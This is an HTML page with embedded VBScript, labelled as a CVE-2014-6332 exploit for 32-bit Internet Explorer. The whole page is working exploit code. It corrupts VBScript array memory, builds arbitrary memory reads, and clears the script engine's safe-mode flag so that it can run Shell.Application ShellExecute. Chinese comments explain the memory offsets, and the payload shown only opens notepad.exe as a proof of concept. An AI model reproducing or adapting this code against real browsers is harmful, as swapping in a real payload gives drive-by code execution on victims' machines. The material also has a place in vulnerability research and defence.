<!DOCTYPE html>
<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<body>
  CVE-2014-6332 exploit by yuange.
<SCRIPT LANGUAGE="VBScript">
function Runmumaa()  
  On Error Resume Next
  set shell=createobject("Shell.Application")
  shell.ShellExecute "notepad.exe"
end function
</script>

<SCRIPT LANGUAGE="VBScript">
dim aa()  
dim ab()
dim a0
dim a1
dim a2
dim a3
dim intVersion
dim myarray

Begin()

function Begin()  
  On Error Resume Next
  info=Navigator.UserAgent

  if (instr(info,"Win64")>0) then  
    exit function
  end if
  if (instr(info,"MSIE")>0) then
    intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
  else
    exit function
  end if

  BeginInit()
  if Create()=True then
    myarray=chrw(01)&chrw(&h880)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
    myarray=myarray&chrw(00)&chrw(&h7FFF)&chrw(00)&chrw(00)  
    Setnotsafemode()
  end if
end function

function BeginInit()  
  Randomize()
  redim aa(5)
  redim ab(5)
  a0=13+17*rnd(6)
  a3=7+3*rnd(5)
end function

function Create()
  On Error Resume Next
  dim i
  Create=False
  for i = 0 to 400
    if Over()=True then
      Create=True
      exit for
    end if
  next
end function

function Over()
  On Error Resume Next
  dim type1
  Over=False
  a0=a0+a3
  a1=a0+2
  a2=a0+&h8000000
  redim Preserve aa(a0)
  redim ab(a0)
  
  redim Preserve aa(a2)

  type1=1
  ab(0)=1.012345678901234567890123456789  
  aa(a0)=10

  if (IsObject(aa(a1-1)) = False) then
    if (VarType(aa(a1-1))<>0) then
      if (IsObject(aa(a1)) = False) then
        type1=VarType(aa(a1))
      end if
    end if
  end if
  if (type1=&h0b24) then  
    Over=True
  end if
  redim Preserve aa(a0)  
end function


sub testaa()
end sub

function Mydata()  
  On Error Resume Next
  i=testaa
  i=null

  redim Preserve aa(a2)
  ab(0)=0
  aa(a1)=i
  ab(0)=6.36598737437801E-314  
  aa(a1+2)=myarray
  ab(2)=1.74088534731324E-310  
  Mydata=aa(a1)
  redim Preserve aa(a0)
end function

function Setnotsafemode()
  On Error Resume Next

  i=Mydata()    'i为vbscript!CScriptEntryPoint 对象地址
  i=ReadMemo(i+8)
  i=ReadMemo(i+16)  'i为vbscript!COleScript 对象地址

  for k=0 to &h60 step 4  
    j=ReadMemo(i+&h120+k)
    if (j=&he) then      '找到[ecx+0x174]==0x3的位置
      redim Preserve aa(a2)
      aa(a1+2)(i+&h11c+k)=ab(4)   'ab(4)还保留着初始化时的0； aa(a1+2)是用字符串伪造的全址读写array; [ecx+0x174]被赋值为0
      redim Preserve aa(a0)
      exit for
    end if
  next

  ab(2)=1.69759663316747E-313  
  IsEmpty("Before Runmumaa")
  Runmumaa()
end function


function ReadMemo(add)  
  On Error Resume Next
  redim Preserve aa(a2)
  ab(0)=0
  aa(a1)=add+4
  ab(0)=1.69759663316747E-313
  ReadMemo=lenb(aa(a1))  
  ab(0)=0
  redim Preserve aa(a0)
end function
</script>
</body>
</html>